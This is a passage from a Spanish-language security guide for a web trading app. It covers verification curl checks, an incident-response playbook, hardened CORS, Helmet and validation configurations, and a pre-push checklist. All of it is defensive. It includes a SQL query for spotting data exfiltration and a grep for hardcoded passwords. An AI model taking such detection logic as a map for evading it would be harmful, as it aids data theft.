# 10. Verificar headers de seguridad
curl -I http://localhost:8000/api/v1/health | grep -i "x-frame\|content-security\|strict-transport"

# 11. Verificar que errores no exponen stack traces
curl http://localhost:8000/api/orders/invalid-uuid-format
# La respuesta de produccion NO debe contener Python tracebacks

# 12. Verificar que la documentacion de Swagger no es accesible en produccion
curl http://production-domain.com/api/docs
# Debe retornar 404 o estar protegida con autenticacion
```

---

## 12. Incident Response Playbook

### Fase 1: Deteccion (0-15 minutos)

```
TRIGGER: Alert de seguridad, usuario reporta actividad inusual, anomalia en logs

1. Abrir canal #incident-response en Slack
2. Asignar Incident Commander (IC)
3. Determinar severidad:
   - P1 (Critico): Datos de usuarios comprometidos, sistema caido, funds en riesgo
   - P2 (Alto): Posible brecha, degradacion severa, acceso no autorizado sospechoso
   - P3 (Medio): Anomalia no confirmada, comportamiento inusual
4. Crear ticket de incidente con timestamp de inicio
```

### Fase 2: Contencion (15-60 minutos)

```python
# Para P1 — Contener el dano inmediatamente

# Revocar TODOS los tokens de un usuario comprometido
async def emergency_revoke_all_tokens(user_id: UUID):
    await db.execute(
        update(RefreshToken)
        .where(RefreshToken.user_id == user_id)
        .values(is_revoked=True, revoked_at=datetime.utcnow(), revoke_reason="security_incident")
    )
    # Agregar user_id a blacklist en Redis (invalidar access tokens activos)
    await redis.setex(f"blacklist:user:{user_id}", 3600, "1")

# Bloquear una IP especifica
async def block_ip(ip: str, reason: str):
    await redis.setex(f"blocked_ip:{ip}", 86400, reason)  # 24 horas

# Para SQL injection detectado — activar WAF modo strict
# Para credentials comprometidas — rotar inmediatamente
```

### Fase 3: Investigacion (1-4 horas)

```bash
# Extraer logs del periodo del incidente
# Buscar el correlation_id de las requests sospechosas
grep '"user_id": "compromised_user_id"' logs/app.log | \
  jq '. | select(.timestamp > "2025-01-01T10:00:00")' | \
  head -100 > incident_logs.json

# Queries en DB para investigar actividad anormal
SELECT
    user_id,
    action,
    ip_address,
    user_agent,
    created_at,
    metadata
FROM audit_log
WHERE user_id = 'compromised_user_id'
  AND created_at BETWEEN '2025-01-01 10:00:00' AND '2025-01-01 12:00:00'
ORDER BY created_at;

# Verificar si hubo exfiltracion de datos
SELECT
    ip_address,
    COUNT(*) as requests,
    SUM(response_bytes) as total_bytes
FROM access_log
WHERE created_at > NOW() - INTERVAL '24 hours'
GROUP BY ip_address
HAVING SUM(response_bytes) > 100000000  -- 100MB
ORDER BY total_bytes DESC;
```

### Fase 4: Erradicacion y Recuperacion

```
1. Parchear la vulnerabilidad explotada
2. Deploy con el fix (blue-green para evitar downtime)
3. Rotar todos los secrets relacionados con el incidente
4. Restaurar servicio
5. Verificar integridad de datos
```

### Fase 5: Post-mortem (dentro de 5 dias)

```markdown
## Post-mortem: [Titulo del Incidente]

**Fecha del incidente:** YYYY-MM-DD HH:MM UTC
**Duracion:** X horas Y minutos
**Severidad:** P1/P2/P3
**Afectados:** N usuarios, $X en fondos en riesgo
**IC:** [nombre]

### Que paso (timeline)
- HH:MM — Primera anomalia detectada
- HH:MM — Alert disparada
- HH:MM — IC asignado
- HH:MM — Incidente contenido
- HH:MM — Servicio restaurado

### Root Cause
[Descripcion tecnica precisa de la causa raiz]

### Que funciono bien
- [Lista de cosas que salieron bien]

### Que fallo
- [Lista de cosas que fallaron o podrian mejorar]

### Action items (con responsable y deadline)
- [ ] [Accion especifica] - @responsable - Deadline: YYYY-MM-DD
- [ ] [Accion especifica] - @responsable - Deadline: YYYY-MM-DD

### Deteccion: ¿Cómo podemos detectar esto mas rapido?
[Nuevos alertas, metricas, o monitoreo a agregar]
```

---

## 13. Stack-Specific Security Patterns

### FastAPI + React (este proyecto)

```python
# Configuracion de CORS correcta para produccion
app.add_middleware(
    CORSMiddleware,
    # NUNCA ["*"] con credentials=True — violacion de CORS spec
    allow_origins=[
        "https://app.example.com",
        "https://www.example.com",
        # En desarrollo:
        "http://localhost:5173",
    ],
    allow_credentials=True,  # Necesario para cookies HttpOnly
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type", "X-CSRF-Token", "X-Request-ID"],
    max_age=86400,  # Cache preflight 24 horas
)

# Pydantic como primera linea de defensa — validacion estricta
class CreateOrderRequest(BaseModel):
    symbol: str = Field(
        ...,
        pattern=r'^[A-Z]{2,10}USDT$',
        description="Trading pair (e.g. BTCUSDT)"
    )
    quantity: Decimal = Field(..., gt=0, le=Decimal("100"), decimal_places=8)
    side: Literal["BUY", "SELL"]

    model_config = ConfigDict(
        # Rechazar cualquier campo no declarado
        extra="forbid",
        # Trim strings automaticamente
        str_strip_whitespace=True,
    )
```

```typescript
// React — configuracion de axios segura
import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true,       // Incluir cookies HttpOnly
  timeout: 15000,              // 15 segundos timeout
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',  // Ayuda a identificar requests AJAX
  },
});

// Interceptor de respuesta — sanitizar datos antes de renderizar
api.interceptors.response.use((response) => {
  // Los datos ya estan validados por Pydantic en el backend
  // Pero nunca usar response.data directamente en innerHTML
  return response;
});
```

### NestJS + Next.js

```typescript
// NestJS — Helmet para headers de seguridad automaticos
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:"],
      frameSrc: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// NestJS — Class-validator para DTO validation
import { IsString, IsEnum, IsNumber, IsPositive, ValidateIf, Matches, Max } from 'class-validator';
import { Transform } from 'class-transformer';

export class CreateOrderDto {
  @IsString()
  @Matches(/^[A-Z]{2,10}USDT$/)
  @Transform(({ value }) => value.trim().toUpperCase())
  symbol: string;

  @IsEnum(['BUY', 'SELL'])
  side: 'BUY' | 'SELL';

  @IsNumber({ maxDecimalPlaces: 8 })
  @IsPositive()
  @Max(100)
  quantity: number;

  @IsEnum(['MARKET', 'LIMIT'])
  orderType: 'MARKET' | 'LIMIT' = 'MARKET';

  @ValidateIf((o) => o.orderType === 'LIMIT')
  @IsNumber({ maxDecimalPlaces: 8 })
  @IsPositive()
  price?: number;
}

// NestJS — Global ValidationPipe
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,           // Eliminar campos no decorados
  forbidNonWhitelisted: true, // Error si hay campos extra
  transform: true,           // Transformar tipos automaticamente
  transformOptions: {
    enableImplicitConversion: false,  // No hacer conversiones implicitas peligrosas
  },
  stopAtFirstError: false,   // Reportar todos los errores de una vez
}));
```

---

## 14. Security Quick Reference

```
CHECKLIST EXPRESS ANTES DE HACER PUSH:

Autenticacion
[ ] JWT secret >= 256 bits, en .env no en codigo
[ ] Access token exp <= 15 min
[ ] Refresh tokens tienen rotation
[ ] Passwords hasheados con bcrypt (rounds >= 12)

Queries
[ ] Cero concatenacion de strings en SQL
[ ] Todos los inputs validados con Pydantic/class-validator
[ ] UUID para IDs publicos (no integers secuenciales)

API
[ ] Todos los endpoints de escritura requieren auth
[ ] Los usuarios solo ven sus propios datos (IDOR check)
[ ] Rate limiting en endpoints sensibles
[ ] CORS configurado sin wildcard con credentials

Secrets
[ ] .env en .gitignore
[ ] Sin secrets hardcoded (buscar con: grep -r "password=" --include="*.py" src/)
[ ] .env.example actualizado (sin valores reales)

Headers
[ ] HTTPS en produccion
[ ] HSTS configurado
[ ] X-Frame-Options: DENY
[ ] X-Content-Type-Options: nosniff
[ ] CSP configurado

Dependencias
[ ] pip-audit / npm audit sin vulnerabilidades HIGH/CRITICAL
[ ] Dockerfiles con usuario no-root
```
